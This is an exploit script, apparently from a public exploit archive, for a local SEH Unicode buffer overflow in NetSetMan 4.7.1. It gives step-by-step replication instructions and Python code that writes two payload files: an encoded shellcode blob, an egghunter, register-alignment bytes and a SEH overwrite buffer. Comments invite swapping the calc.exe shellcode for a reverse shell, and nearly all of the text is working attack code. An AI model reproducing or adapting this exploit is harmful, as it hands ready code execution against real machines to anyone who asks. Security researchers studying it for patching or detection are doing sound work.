#Exploit Title: NetSetMan 4.7.1 - Local Buffer Overflow (SEH Unicode)
#Exploit Author: Devin Casadey
#Discovery Date: 2019-03-11
#Vendor Homepage: https://www.netsetman.com/
#Software Link: https://www.netsetman.com/netsetman.exe
#Tested Version: 4.7.1
#Tested on: Windows XP SP3

#-------------------------------------------------------------------------------

#Steps to replicate:
#1. Run the Python code below which outputs two payload .txt files.
#2. Open NetSetMan
#3. Enable "Workgroup" for both the "[Double Click!]" tab and "SET1" tab
#4. Paste contents of "payload2.txt" into the "Workgroup" field in the "SET1" tab.
#5. Paste contents of "payload1.txt" into the "Workgroup" field in the "[Double Click!]" tab.
#6. Click "Activate"
#7. ...
#8. Profit

#This is a unicode SEH overflow, but the buffer is too small for a unicode encoded reverse shell payload.
#Therefore, an egghunter is implemented to locate an alphanumeric encoded payload stored in memory.

#-------------------------------------------------------------------------------

# ! alpha upperlower encoding

# msfvenom -p windows/exec cmd=calc.exe -b "\x00" -e x86/alpha_mixed -f python

# ! Structured Exception Handler overwrite exploit

#-v shellcode EXITFUNC=seh BufferRegister=EDI
#Payload size: 440 bytes

# ! Egghunter looks for double-egg w00t
shellcode =  ""
shellcode = "w00tw00t"

# ! Replace this with my own reverse shell
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x69\x6c\x59\x78\x6d\x52\x57\x70"
shellcode += "\x43\x30\x75\x50\x53\x50\x6c\x49\x49\x75\x36\x51"
shellcode += "\x39\x50\x71\x74\x6c\x4b\x56\x30\x46\x50\x4e\x6b"
shellcode += "\x71\x42\x46\x6c\x4e\x6b\x76\x32\x57\x64\x6e\x6b"
shellcode += "\x44\x32\x34\x68\x76\x6f\x6d\x67\x43\x7a\x71\x36"
shellcode += "\x44\x71\x6b\x4f\x6e\x4c\x57\x4c\x65\x31\x33\x4c"
shellcode += "\x47\x72\x36\x4c\x75\x70\x6f\x31\x5a\x6f\x34\x4d"
shellcode += "\x67\x71\x39\x57\x48\x62\x4a\x52\x43\x62\x46\x37"
shellcode += "\x6c\x4b\x32\x72\x32\x30\x6c\x4b\x71\x5a\x45\x6c"
shellcode += "\x6e\x6b\x70\x4c\x32\x31\x73\x48\x4a\x43\x63\x78"
shellcode += "\x56\x61\x6e\x31\x56\x31\x6e\x6b\x30\x59\x57\x50"
shellcode += "\x35\x51\x79\x43\x6c\x4b\x72\x69\x55\x48\x4d\x33"
shellcode += "\x46\x5a\x52\x69\x4e\x6b\x77\x44\x6e\x6b\x76\x61"
shellcode += "\x68\x56\x75\x61\x6b\x4f\x6c\x6c\x59\x51\x78\x4f"
shellcode += "\x66\x6d\x77\x71\x4b\x77\x30\x38\x6d\x30\x51\x65"
shellcode += "\x58\x76\x53\x33\x43\x4d\x69\x68\x67\x4b\x73\x4d"
shellcode += "\x67\x54\x50\x75\x4b\x54\x62\x78\x4c\x4b\x73\x68"
shellcode += "\x76\x44\x57\x71\x68\x53\x71\x76\x6e\x6b\x56\x6c"
shellcode += "\x72\x6b\x6e\x6b\x43\x68\x47\x6c\x66\x61\x6e\x33"
shellcode += "\x6e\x6b\x76\x64\x6c\x4b\x36\x61\x6a\x70\x6d\x59"
shellcode += "\x31\x54\x76\x44\x66\x44\x63\x6b\x61\x4b\x65\x31"
shellcode += "\x51\x49\x50\x5a\x73\x61\x59\x6f\x79\x70\x51\x4f"
shellcode += "\x71\x4f\x43\x6a\x4e\x6b\x55\x42\x5a\x4b\x4c\x4d"
shellcode += "\x73\x6d\x61\x7a\x37\x71\x6c\x4d\x6c\x45\x58\x32"
shellcode += "\x55\x50\x45\x50\x43\x30\x36\x30\x52\x48\x64\x71"
shellcode += "\x6c\x4b\x32\x4f\x4e\x67\x59\x6f\x79\x45\x4f\x4b"
shellcode += "\x6b\x4e\x56\x6e\x75\x62\x48\x6a\x65\x38\x6f\x56"
shellcode += "\x4a\x35\x6d\x6d\x6f\x6d\x6b\x4f\x68\x55\x75\x6c"
shellcode += "\x53\x36\x43\x4c\x36\x6a\x4b\x30\x4b\x4b\x6d\x30"
shellcode += "\x34\x35\x77\x75\x4f\x4b\x62\x67\x64\x53\x30\x72"
shellcode += "\x72\x4f\x30\x6a\x53\x30\x43\x63\x4b\x4f\x68\x55"
shellcode += "\x42\x43\x30\x61\x70\x6c\x31\x73\x44\x6e\x30\x65"
shellcode += "\x32\x58\x51\x75\x55\x50\x41\x41"

# ! No need to replace this egghunter. It looks for w00tw00t

egghunter =(
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIA"
"IAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30A"
"PB944JBC6SQGZKOLO0B0RQZOSR88MNNOLKUPZSDJO6XT7NPNP3DTKKJ6OD5JJ"
"6OBUK7KOYWLJA"
)

# ! Align registers code and then rets to ESP

regPrep = (
    "\x63" #nop/align
    "\x55" #push ebp
    "\x62" #nop/align
    "\x58" #pop eax
    "\x62" #nop/align
    "\x05\x14\x11" #add eax, 0x11001400
    "\x62" #nop/align
    "\x2d\x13\x11" #sub eax, 0x11001300
    "\x62" #nop/align
    "\x50" #push eax
    "\x62" #nop/align
    "\xc3") #ret

# ! \x61\x62 appears to be a unicode NOP.
buffer = ""
buffer += "\x61" * 75 #junk
buffer += "\x62" * 1  #nop

#0x00590058 : pop ebx # pop ebp # ret 0x08 | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [netsetman.exe]
#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.7.1.0 (C:\Program Files\NetSetMan\netsetman.exe)

# ! SEH overwrite exploit
buffer += "\x58\x59" #SEH overwrite to pop-pop-ret instruction
buffer += regPrep

# ! Unicode nops of 108 bytes to reach egghunter
buffer += "\x62" * 108 #offset to egghunter
buffer += egghunter

# ! netsetman must load this payload file

#Write initial SEH overflow payload + egghunter with venetian shellcode
f = open('payload1.txt','w')
f.write(buffer)
f.close()

# ! Use this one

#Egg + alphanumeric encoded shellcode payload
g = open('payload2.txt', 'w')
g.write(shellcode)
g.close()
